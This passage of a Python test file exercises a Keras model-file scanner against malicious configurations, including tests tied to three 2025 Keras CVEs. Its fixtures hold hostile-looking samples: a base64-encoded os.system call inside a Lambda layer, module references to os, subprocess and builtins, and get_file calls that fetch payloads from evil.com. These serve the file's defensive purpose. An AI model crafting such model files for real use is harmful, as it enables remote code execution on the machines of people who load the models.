        config = {"class_name": "Sequential", "config": {"layers": []}}
        with zipfile.ZipFile(archive_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("plugin.sology", "not a shared object")
            zf.writestr("plugin.so.version", "not a versioned shared object")
            zf.writestr("plugin.so.6cache", "not a versioned shared object")
            zf.writestr("plugin.dllcache", "not a dll")
            zf.writestr("launcher.bashrc", "not a standalone bash script")
            zf.writestr("runner.cmdline", "not a cmd script")
            zf.writestr("screensaver.scrub", "not a screensaver")
            zf.writestr("payload.composer", "not a DOS executable")
            zf.writestr("dropper.ps10", "not a PowerShell script")
            zf.writestr("installer.executable", "not a PE executable")
            zf.writestr("batch.baton", "not a batch script")

        result = KerasZipScanner().scan(str(archive_path))

        assert not any(
            check.name == "Executable File Detection" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_nested_models(self, tmp_path: Path) -> None:
        """Test scanning of nested model structures."""
        scanner = KerasZipScanner()

        # Create nested model with Lambda in submodel
        malicious_code = '__import__("os").system("cmd")'
        encoded_code = base64.b64encode(malicious_code.encode()).decode()

        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "Lambda",
                                    "name": "nested_lambda",
                                    "config": {
                                        "function": [encoded_code, None, None],
                                    },
                                }
                            ]
                        },
                    }
                ]
            },
        }

        temp_path = tmp_path / "nested_models.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Should detect Lambda in nested model
        assert len(result.issues) > 0, "Should detect Lambda in nested model"

        # Check that __import__ was detected
        import_found = False
        for issue in result.issues:
            if "__import__" in issue.message.lower():
                import_found = True
                break

        assert import_found, "Should detect __import__ in nested Lambda"

    def test_invalid_json_config(self, tmp_path: Path) -> None:
        """Test handling of invalid JSON in config."""
        scanner = KerasZipScanner()

        temp_path = tmp_path / "invalid_json.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", "{ invalid json }")

        result = scanner.scan(str(temp_path))

        # Should handle invalid JSON gracefully
        assert not result.success
        json_error_found = False
        for check in result.checks:
            if "parse" in check.message.lower() and "json" in check.message.lower():
                json_error_found = True
                break

        assert json_error_found, "Should report JSON parsing error"

    def test_missing_config_json(self, tmp_path: Path) -> None:
        """Test handling of .keras file without config.json."""
        scanner = KerasZipScanner()

        temp_path = tmp_path / "missing_config.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            # Only add metadata, no config
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

        result = scanner.scan(str(temp_path))

        # Should handle missing config.json
        missing_config_found = False
        for check in result.checks:
            if "config.json" in check.message:
                missing_config_found = True
                break

        assert missing_config_found, "Should report missing config.json"

    def test_detects_subclassed_model_in_zip(self, tmp_path):
        """Test that scanner detects subclassed models with custom class names."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "model.keras"

        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {
                "class_name": "MyCustomTransformer",  # Subclassed model
                "config": {
                    "name": "custom_transformer",
                    "layers": [
                        {"class_name": "Dense", "config": {"units": 10}},
                    ],
                },
            }
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

        result = scanner.scan(str(keras_path))

        from modelaudit.scanners.base import CheckStatus

        subclass_checks = [c for c in result.checks if "subclassed" in c.name.lower()]
        assert len(subclass_checks) > 0
        assert subclass_checks[0].status != CheckStatus.PASSED
        assert subclass_checks[0].severity == IssueSeverity.INFO

    def test_compile_config_detects_custom_layer_loss_and_metric(self, tmp_path: Path) -> None:
        """ZIP scanner should inspect compile_config and custom layer classes."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "MaliciousLayer",
                        "name": "malicious_layer",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": "malicious_loss",
                "metrics": [{"class_name": "MaliciousMetric", "config": {"name": "malicious_metric"}}],
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="custom_objects.keras")))

        custom_layer_checks = [check for check in result.checks if check.name == "Custom Layer Class Detection"]
        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert any(check.details.get("layer_class") == "MaliciousLayer" for check in custom_layer_checks)
        assert any(check.details.get("identifier") == "MaliciousMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "malicious_loss" for check in custom_loss_checks)

    def test_compile_config_detects_nested_metric_and_loss_mappings(self, tmp_path: Path) -> None:
        """Nested compile_config structures should not bypass custom-object detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": "malicious_loss"},
                "metrics": [["accuracy", {"class_name": "MaliciousMetric", "config": {"name": "metric"}}]],
                "weighted_metrics": {"output_1": ["Precision", "WeightedBackdoorMetric"]},
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="nested_compile.keras")))

        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert any(check.details.get("identifier") == "MaliciousMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "WeightedBackdoorMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "malicious_loss" for check in custom_loss_checks)

    def test_compile_config_safe_aliases_and_builtin_layers_do_not_false_positive(self, tmp_path: Path) -> None:
        """Safe aliases and built-in preprocessing layers should remain clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 32, 32, 3]},
                    },
                    {
                        "class_name": "RandomShear",
                        "name": "random_shear",
                        "config": {"factor": 0.1},
                    },
                    {
                        "class_name": "RandomColorJitter",
                        "name": "random_color_jitter",
                        "config": {"value_range": [0, 255], "brightness_factor": 0.1},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": "mae", "output_2": "mse"},
                "metrics": [["accuracy", "AUC"], [{"class_name": "MeanSquaredError", "config": {}}]],
                "weighted_metrics": {"output_1": ["Precision", "Recall"]},
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="safe_compile.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Metric Detection" for check in result.checks)
        assert all(check.name != "Custom Loss Detection" for check in result.checks)

    def test_compile_config_deduplicates_custom_object_identifiers_by_normalized_name(
        self,
        tmp_path: Path,
    ) -> None:
        """Repeated custom metric/loss aliases with case or spacing drift should only emit once."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": ["malicious_loss", " MALICIOUS_LOSS "]},
                "metrics": [
                    "MaliciousMetric",
                    " maliciousmetric ",
                    {"class_name": "MALICIOUSMETRIC", "config": {}},
                ],
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="dedupe_compile.keras")))

        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert [check.details.get("identifier") for check in custom_metric_checks] == ["MaliciousMetric"]
        assert [check.details.get("identifier") for check in custom_loss_checks] == ["malicious_loss"]

    def test_registered_builtin_layer_does_not_false_positive(self, tmp_path: Path) -> None:
        """Built-in layers with registered_name metadata should remain clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "add_1",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "Add",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="builtin_registered.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_builtin_registered_name_with_non_allowlisted_module_is_flagged(self, tmp_path: Path) -> None:
        """Spoofed built-in registered names must not hide custom modules."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "evil.module",
                        "registered_name": "Add",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="spoofed_builtin_registered.keras"))
        )

        custom_object_checks = [check for check in result.checks if check.name == "Custom Object Detection"]
        assert len(custom_object_checks) == 1
        assert custom_object_checks[0].details["registered_name"] == "Add"

    def test_builtin_registered_name_with_mixed_module_refs_is_flagged(self, tmp_path: Path) -> None:
        """A safe module reference must not suppress a separate unsafe one."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "Add",
                        "config": {"fn_module": "evil.module"},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="mixed_builtin_registered.keras"))
        )

        custom_object_checks = [check for check in result.checks if check.name == "Custom Object Detection"]
        assert len(custom_object_checks) == 1
        assert custom_object_checks[0].details["registered_name"] == "Add"

    def test_builtin_class_with_non_allowlisted_module_and_no_registered_name_is_flagged(self, tmp_path: Path) -> None:
        """Built-in class names must still be flagged when module metadata points outside the allowlist."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "evil.module",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="builtin_class_evil_module.keras"))
        )

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)
        assert any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_allowlisted_module_layer_does_not_false_positive(self, tmp_path: Path) -> None:
        """Layers from allowlisted Keras modules should not be treated as custom objects."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "NotEqual",
                        "name": "not_equal",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "NotEqual",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="allowlisted_module.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_allowlisted_registered_object_without_module_does_not_false_positive_custom_object(
        self, tmp_path: Path
    ) -> None:
        """Allowlisted registered objects should not need module metadata to suppress custom-object warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "NotEqual",
                        "name": "not_equal",
                        "registered_name": "NotEqual",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="allowlisted_registered_without_module.keras"))
        )

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_allowlisted_module_does_not_suppress_unknown_custom_layer(self, tmp_path: Path) -> None:
        """Unknown classes must still be flagged even if module metadata looks Keras-owned."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "EvilLayer",
                        "name": "evil_layer",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "EvilLayer",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="evil_allowlisted.keras")))

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)
        assert any(check.name == "Custom Object Detection" for check in result.checks)

    def test_generic_base_layer_class_still_flags_custom_layer(self, tmp_path: Path) -> None:
        """The abstract Keras base Layer export should not suppress custom-layer review."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Layer",
                        "name": "generic_layer",
                        "module": "keras.layers",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="generic_layer.keras")))

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)


class TestCVE202549655TorchModuleWrapper:
    """Test CVE-2025-49655: TorchModuleWrapper deserialization RCE detection."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with the given config.json."""
        return _build_test_keras_zip(config, tmp_path, "3.11.0")

    def _make_keras_zip_with_version(self, config: dict[str, Any], tmp_path: Path, keras_version: str) -> str:
        return _build_test_keras_zip(config, tmp_path, keras_version)

    def test_torch_module_wrapper_detected_critical(self, tmp_path: Path) -> None:
        """TorchModuleWrapper layer should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "torch_wrapper_1",
                        "config": {"module": "my_torch_module"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1, "Should detect TorchModuleWrapper as CVE-2025-49655"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_torch_module_wrapper_attribution_details(self, tmp_path: Path) -> None:
        """CVE attribution details should be present."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "wrapper",
                        "config": {},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-49655"
        assert details["cvss"] == 9.8
        assert details["cwe"] == "CWE-502"
        assert details["description"]
        assert "3.11.3" in details["remediation"]

    def test_no_false_positive_dense_layer(self, tmp_path: Path) -> None:
        """Dense layers should NOT trigger CVE-2025-49655."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) == 0, "Dense layer should not trigger CVE-2025-49655"

    def test_nested_torch_module_wrapper(self, tmp_path: Path) -> None:
        """TorchModuleWrapper in nested model should still be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "TorchModuleWrapper",
                                    "name": "nested_wrapper",
                                    "config": {},
                                }
                            ]
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1, "Should detect TorchModuleWrapper in nested model"

    def test_no_cve_for_fixed_keras_version(self, tmp_path: Path) -> None:
        """Keras >=3.11.3 should not be CVE-attributed for TorchModuleWrapper."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "torch_wrapper_1",
                        "config": {"module": "my_torch_module"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, "3.11.3"))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) == 0, "Fixed Keras versions should not get CVE-2025-49655 attribution"
        risk_checks = [c for c in result.checks if c.name == "TorchModuleWrapper Version Risk Check"]
        assert len(risk_checks) >= 1
        assert risk_checks[0].severity == IssueSeverity.WARNING

    def test_two_part_version_is_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """Keras 3.11 should be interpreted as vulnerable (patch=0)."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }
        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, "3.11"))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """PEP 440 prerelease/dev versions in vulnerable 3.11.x range should be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }

        for prerelease_version in ["3.11.0a0", "3.11.1rc1", "3.11.2.dev0"]:
            result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, prerelease_version))
            cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
            assert len(cve_issues) >= 1, f"Prerelease {prerelease_version} should be treated as vulnerable"
            assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_torch_module_wrapper_version_unknown(self, tmp_path: Path) -> None:
        """Missing or non-canonical version should emit warning, not pass."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }
        keras_path = tmp_path / "unknown_version.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({}))  # No keras_version

        result = scanner.scan(str(keras_path))
        warning_checks = [c for c in result.checks if "Version Unknown" in c.name]
        assert len(warning_checks) >= 1
        assert warning_checks[0].severity == IssueSeverity.WARNING


class TestCVE20251550ModuleReferences:
    """Test CVE-2025-1550: Keras safe_mode bypass via arbitrary module references in config.json."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with the given config.json."""
        return _build_test_keras_zip(config, tmp_path, "3.0.0")

    def test_dangerous_module_os_in_layer(self, tmp_path: Path) -> None:
        """A layer referencing 'os' module should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "os",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous 'os' module reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_dangerous_module_subprocess_in_fn_module(self, tmp_path: Path) -> None:
        """A layer with fn_module='subprocess' should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10, "fn_module": "subprocess"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous 'subprocess' fn_module reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_dangerous_module_builtins_dotpath(self, tmp_path: Path) -> None:
        """A layer referencing 'builtins.eval' should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "evil_dense",
                        "module": "builtins",
                        "config": {"units": 1},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert "builtins" in cve_issues[0].message

    def test_untrusted_module_custom_package(self, tmp_path: Path) -> None:
        """Unknown module references in callable context should be flagged as WARNING."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "fn_module": "my_custom_package.layers",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should flag non-allowlisted module"
        assert cve_issues[0].severity == IssueSeverity.WARNING

    def test_safe_keras_module_no_false_positive(self, tmp_path: Path) -> None:
        """A layer referencing 'keras.layers' should NOT be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Safe keras.layers module should not be flagged"

    def test_safe_tensorflow_module_no_false_positive(self, tmp_path: Path) -> None:
        """A layer referencing 'tensorflow.keras.layers' should NOT be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "tensorflow.keras.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Safe tensorflow module should not be flagged"

    def test_nested_model_module_reference(self, tmp_path: Path) -> None:
        """Dangerous module in nested model layer should be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "Dense",
                                    "name": "nested_evil",
                                    "module": "shutil",
                                    "config": {"units": 1},
                                }
                            ]
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous module in nested model"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE-2025-1550 details should be present in issue details."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "os",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-1550"
        assert details["cvss"] == 9.8
        assert details["cwe"] == "CWE-502"
        assert details["description"]

    def test_none_module_value_not_flagged(self, tmp_path: Path) -> None:
        """Layer with module=None should not trigger CVE-2025-1550."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": None,
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "None module should not trigger CVE"

    def test_non_callable_layer_unknown_module_not_flagged(self, tmp_path: Path) -> None:
        """Unknown module on non-callable layers should not produce noisy CVE warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "my_custom_package.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Non-callable layer module should not trigger CVE-2025-1550 warning"

    def test_prefix_collision_module_is_not_allowlisted(self, tmp_path: Path) -> None:
        """Module like 'mathutils.payload' should NOT be treated as safe 'math'."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "fn_module": "mathutils.payload",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "mathutils should not match safe 'math' prefix"
        assert cve_issues[0].severity == IssueSeverity.WARNING


class TestCVE20258747GetFileGadget:
    """Test CVE-2025-8747: keras.utils.get_file gadget bypass detection."""

    def test_get_file_reference_reuses_lowered_value_text(self) -> None:
        """Non-exact callable checks should lowercase each string once."""

        class CountingValue(str):
            lower_calls = 0

            def strip(self, chars: str | None = None, /) -> "CountingValue":
                return self

            def lower(self) -> str:
                type(self).lower_calls += 1
                return super().lower()

        assert _has_get_file_reference([CountingValue("pkg.keras.utils.get_file")])
        assert CountingValue.lower_calls == 1

    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with raw config string."""
        return _build_test_keras_zip(config_str, tmp_path, "3.5.0")

    def test_get_file_with_url_detected(self, tmp_path: Path) -> None:
        """Config referencing get_file with URL should be CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.utils",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.com/payload.bin",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_description_scoped_get_file_with_url_is_not_treated_as_documentation(self, tmp_path: Path) -> None:
        """Doc-like paths should still scan callable get_file plus URL fields."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "description": {
                    "fn": "keras.utils.get_file",
                    "url": "https://evil.com/payload.tar.gz",
                }
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1

    def test_description_class_name_get_file_docs_not_flagged(self, tmp_path: Path) -> None:
        """Doc tables that name get_file class fields should stay documentation-only."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "description": {
                    "class_name": "keras.utils.get_file",
                    "url": "https://docs.example/keras-get-file-guide",
                    "notes": "Documentation table describing the get_file function signature.",
                }
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert cve_issues == []

    def test_description_url_with_get_file_prose_not_flagged(self, tmp_path: Path) -> None:
        """Doc URLs plus prose mentions should not be treated as executable get_file calls."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "description": {
                    "summary": "Documentation example: keras.utils.get_file can download files in user code.",
                    "url": "https://docs.example/keras-get-file-guide",
                }
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert cve_issues == []

    def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
        """Config with URL inside args list should also be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
